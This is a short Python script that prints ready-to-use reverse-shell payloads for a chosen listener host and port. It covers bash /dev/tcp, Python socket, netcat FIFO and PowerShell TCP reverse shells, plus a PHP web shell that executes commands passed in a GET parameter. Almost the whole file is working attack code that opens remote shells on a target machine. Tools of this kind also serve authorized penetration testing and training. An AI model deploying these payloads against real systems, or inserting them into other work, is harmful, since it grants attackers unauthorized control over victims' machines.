from rich.console import Console
from rich.panel import Panel

console = Console()

def generate_payloads(lhost: str, lport: str):
    bash_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    python_shell = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    nc_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    php_web_shell = f"<?php system($_GET['cmd']); ?>"
    powershell_shell = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

    console.print(Panel(f"[bold yellow]1. Bash Reverse Shell:[/bold yellow]\n[cyan]{bash_shell}[/cyan]", border_style="green"))
    console.print(Panel(f"[bold yellow]2. Python3 Reverse Shell:[/bold yellow]\n[cyan]{python_shell}[/cyan]", border_style="green"))
    console.print(Panel(f"[bold yellow]3. Netcat (FIFO) Reverse Shell:[/bold yellow]\n[cyan]{nc_shell}[/cyan]", border_style="green"))
    console.print(Panel(f"[bold yellow]4. PHP One-Liner Web Shell:[/bold yellow]\n[cyan]{php_web_shell}[/cyan]", border_style="green"))
    console.print(Panel(f"[bold yellow]5. PowerShell Reverse Shell:[/bold yellow]\n[cyan]{powershell_shell}[/cyan]", border_style="green"))
